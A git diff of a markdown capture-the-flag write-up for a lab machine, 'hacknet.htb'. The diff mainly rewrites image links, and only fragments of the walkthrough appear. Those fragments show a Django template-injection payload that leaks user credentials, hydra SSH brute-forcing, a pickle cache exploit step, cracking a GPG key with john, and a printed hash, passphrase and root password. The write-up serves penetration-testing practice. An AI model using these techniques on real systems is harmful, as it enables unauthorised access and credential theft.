@@ -1,5 +1,5 @@
 ### Nmap
-```bash
+```
 nmap -sV -sC -vv 10.10.11.85
 Nmap scan report for 10.10.11.85
 Host is up, received reset ttl 63 (0.019s latency).
@@ -21,23 +21,23 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 
-![[Pasted image 20251203200359.png]]
+![Pasted image 20251203200359](../Attachments/Pasted%20image%2020251203200359.png)
 
 - Creating new user
-![[Pasted image 20251203200452.png]]
+![Pasted image 20251203200452](../Attachments/Pasted%20image%2020251203200452.png)
 `test@test.com:test:test`
-![[Pasted image 20251203200552.png]]
+![Pasted image 20251203200552](../Attachments/Pasted%20image%2020251203200552.png)
 
 - Looking at framework from wappalyzer I see Django. Which leads to testing for SSTI vulnerability:
-![[Pasted image 20251203212056.png]]
+![Pasted image 20251203212056](../Attachments/Pasted%20image%2020251203212056.png)
 
 - When we explore posts, we can like them, and if we hover over likes we see some profile pictures. 
 - checking the network or from burp suite we see calls to `/like` and `/likes/`. If we check the source code for likes we see the list of users under title:
-![[Pasted image 20251203212234.png]]
+![Pasted image 20251203212234](../Attachments/Pasted%20image%2020251203212234.png)
 - We can change our name to `{{users.values}}` to get an output here.
 	- Edit name to `{{ users.values }}`
 - Relike and hover over likes to initiate the call to `/likes`. then access source code of likes to find list of usernames and passwords of the people who likes it :
-![[Pasted image 20251203212401.png]]
+![Pasted image 20251203212401](../Attachments/Pasted%20image%2020251203212401.png)
 ```
 mail : ciphermail
 
@@ -114,12 +114,12 @@ for item in all_users:
 ```
 
 - I execute it and send the output to `creds` file:
-```bash
+```
 python3 try.py > creds
 ```
 
 - Then using hydra I brute force ssh with these creds to get a hit on `mikey` user:
-![[Pasted image 20251203222207.png]]
+![Pasted image 20251203222207](../Attachments/Pasted%20image%2020251203222207.png)
 ```
 hydra -C creds ssh://hacknet.htb -I
 ---OUTPUT---
@@ -130,7 +130,7 @@ hydra -C creds ssh://hacknet.htb -I
 ```
 ssh mikey@hacknet.htb
 ```
-![[Pasted image 20251203222319.png]]
+![Pasted image 20251203222319](../Attachments/Pasted%20image%2020251203222319.png)
 
 - With linpeas I notice a world writeable file at `/var/tmp.django_cache`
 ## New kind of exploit
@@ -230,11 +230,11 @@ cp exploit.pickle 01866fb83c241f0c42a9f14275d1afb5.djcache
 ```
 
 - Now we get shell as user sandy.
-![[Pasted image 20251204083624.png]]
+![Pasted image 20251204083624](../Attachments/Pasted%20image%2020251204083624.png)
 
 - Looking at `sandy`'s home directory I find a hidden `gnpg` directory which holds some private keys. One of them is `armored_key.asc` which doesn't change (while the others keep changing, new generated/old delted maybe)
-![[Pasted image 20251204083707.png]]
-![[Pasted image 20251204083826.png]]
+![Pasted image 20251204083707](../Attachments/Pasted%20image%2020251204083707.png)
+![Pasted image 20251204083826](../Attachments/Pasted%20image%2020251204083826.png)
 
 - Looking online I see I can crack it with john.
 - I copy the file locally and pass the following command to retrieve a hash
@@ -245,7 +245,7 @@ gpg2john key
 File key
 Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293cd490d0f54227788f93637a930a185ab86bc6d4bfd324fdb4f908b41696f71db01b3930cdfbc854a81adf642f5797f94ddf7e67052ded428ee6de69fd4c38f0c6db9fccc6730479b48afde678027d0628f0b9046699033299bc37b0345c51d7fa51f83c3d857b72a1e57a8f38302ead89537b6cb2b88d0a953854ab6b0cdad4af069e69ad0b4e4f0e9b70fc3742306d2ddb255ca07eb101b07d73f69a4bd271e4612c008380ef4d5c3b6fa0a83ab37eb3c88a9240ddeda8238fd202ccc9cf076b6d21602dd2394349950be7de440618bf93bcde73e68afa590a145dc0e1f3c87b74c0e2a96c8fe354868a40ec09dd217b815b310a41449dc5fbdfca513fadd5eeae42b65389aecc628e94b5fb59cce24169c8cd59816681de7b58e5f0d0e5af267bc75a8efe0972ba7e6e3768ec96040488e5c7b2aa0a4eb1047e79372b3605*3*254*2*7*16*db35bd29d9f4006bb6a5e01f58268d96*65011712*850ffb6e35f0058b:::Sandy (My key for backups) <sandy@hacknet.htb>::key
 ```
-![[Pasted image 20251204084123.png]]
+![Pasted image 20251204084123](../Attachments/Pasted%20image%2020251204084123.png)
 
 - I then crack the hash with john:
 ```
@@ -265,7 +265,7 @@ sweetheart       (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-![[Pasted image 20251204084157.png]]
+![Pasted image 20251204084157](../Attachments/Pasted%20image%2020251204084157.png)
 - I get the passphrase `sweetheart`
 
 - Looking online further I see I can decrypt gpg files with this key.
@@ -277,7 +277,7 @@ gpg --batch --yes --pinentry-mode loopback \
 ```
 - I use `--pinentry-mode` as i was receiving screen to small error probably due to the shell i have. Not sure if it matters as I export the output to a file.
 - Then on reading the file I find something interesting
-![[Pasted image 20251204084856.png]]
+![Pasted image 20251204084856](../Attachments/Pasted%20image%2020251204084856.png)
 
 - Alternatively I found this script than auomates it and decrypts all : (havent checked)
 ```
@@ -312,5 +312,5 @@ echo "[*] Done. Decrypted files are in $OUTPUT_DIR"
 - I see the root password for MYSQL is `h4ck3rs4re3veRywh3re99`
 
 - Using this I can switch to root user and grab the root flag:
-![[Pasted image 20251204085137.png]]
+![Pasted image 20251204085137](../Attachments/Pasted%20image%2020251204085137.png)
 
